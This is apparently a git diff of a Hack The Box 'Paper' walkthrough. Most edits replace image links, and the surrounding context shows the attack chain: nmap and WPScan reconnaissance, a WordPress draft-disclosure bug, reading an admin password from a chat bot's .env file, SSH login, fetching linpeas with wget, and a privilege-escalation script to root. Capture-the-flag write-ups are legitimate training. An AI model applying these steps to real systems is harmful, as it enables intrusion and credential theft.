@@ -17,8 +17,10 @@ Hi folks, today I am going to solve an easy rated hack the box machine,Paper cre
 nmap -sC -sV  -A -oN nmap/paper 10.10.11.143 
 ```
 
-  #### output
-    ![[nmap.png]] 
+
+#### output
+  
+ ![image](https://user-images.githubusercontent.com/64952843/165168557-5be11a45-98f6-4504-9f86-de3a455dad2e.png)
 
 
   ```bash
@@ -56,7 +58,7 @@ port[80]-http
 port[443]-ssl/http
 
 ## Default Page
-![[web page.png]]
+![[webpage.png]]
 
 so i did not have a clue then i decide to curl the page to see if there are additional things then i found someting exitting the back end server so a hostname
 
@@ -65,7 +67,7 @@ so i did not have a clue then i decide to curl the page to see if there are addi
 curl -I http://10.10.11.143/
 ```
 
-![[curl2.png]]
+![image](https://user-images.githubusercontent.com/64952843/165169992-57b38daf-5895-470b-af65-c6f7da89ab7f.png)
 
 ```bash
 HTTP/1.1 403 Forbidden
@@ -90,11 +92,11 @@ echo 10.10.11.143 office.paper > /etc/hosts
 so let open the page http://office.paper its a Blunder Tiffin inc
 
 #### office paper page
-![[office.png]]
+![image](https://user-images.githubusercontent.com/64952843/165168524-5a4263c6-8c2a-4af8-9314-92e18c9fde32.png)
 
 
 Then when i checked at the footer i found a Login page for wordpress this means it is a wordpress site.
-![[loginwordpress.png]]
+![image](https://user-images.githubusercontent.com/64952843/165168989-ed96ee51-cb99-4d0e-ab30-d4e48102dd67.png)
 
 so i stated doing some background code execution using Wpscan to find more about this site
 
@@ -125,17 +127,17 @@ Then after doing some digging abou the CVE i found out that the vunerability cou
 so i decide to change my url to this so i can view the draft posts http://office.paper/?static=1
 
 #### static=1 page
-![[static.png]]
+![image](https://user-images.githubusercontent.com/64952843/165167545-c9571500-dcb2-4229-b9f2-44c91f180205.png)
 
 Then there was a secret registration URL of a Chat System http://chat.office.paper/register/8qozr226AhkCHZdyY
 
 #### chat-registration
-![[regis.png]]
+![image](https://user-images.githubusercontent.com/64952843/165167939-67aad929-2d07-4ec6-9d84-5bcc1d100b19.png)
 
 so after registering i was redirected back to a rocket chat
 
 #### chat
-![[chat.png]]
+![image](https://user-images.githubusercontent.com/64952843/165170066-1b7b7493-3ec1-41f6-8496-e48ef2ed2df0.png)
 
 so there was a channel general so as you see Dwight is the admin and he added a bot **Recyclops** and the bot can help you get some files but you can not chat in the general channel because its read-only so you have to directly chat the bot **Recyclops** 
 
@@ -206,9 +208,9 @@ rocketchat:x:1001:1001::/home/rocketchat:/bin/bash
 
 so i decide to get the **user.txt** but i got a response **Acess denied !**  so i decide to list the files and started to go one by one to see what i can get and in hubot i got a **.env** and when i open it i got a password for the admin
 
-![[botlist.png]]
+![image](https://user-images.githubusercontent.com/64952843/165170318-33ab9a5c-8797-4219-824c-0e2784025f62.png)
 
-![[env.png]]
+![image](https://user-images.githubusercontent.com/64952843/165169294-9ae40411-aec7-47a4-945f-1996c4ee460e.png)
 
 #### code-env
 ```shell
@@ -248,7 +250,7 @@ sudo ssh dwight@10.10.11.143
 
 successful code injection and i got the shell 
 
-![[dwight.png]]
+![image](https://user-images.githubusercontent.com/64952843/165169967-e681915c-6f21-4272-8364-661640261d7e.png)
 
 
 ## Takeover
@@ -298,7 +300,7 @@ Then to the box use this code to to get linpeas.sh
 wget ip/linpeas.sh
 ```
 
-![[linpeas.png]]
+![image](https://user-images.githubusercontent.com/64952843/165169122-c2fb4425-1ca3-47fd-b4c5-0aeabb825f0c.png)
 
 so you run linpeas using this
 
@@ -428,11 +430,12 @@ so i copied it and opened a file with python extention as **privillage.py** and 
 python3 privillage.py
 ```
 
-![[privillage.png]]
+![image](https://user-images.githubusercontent.com/64952843/165168191-a344fe1a-3e12-4547-a01a-bd51cc7d37cc.png)
+
 
 Then boom i got the root access!
 
-![[root.png]]
+![image](https://user-images.githubusercontent.com/64952843/165168118-59dec2e0-d7d0-4f64-9ccd-5b8a41e73a3c.png)
 
 Successfully obtained the flag file with root privileges
 
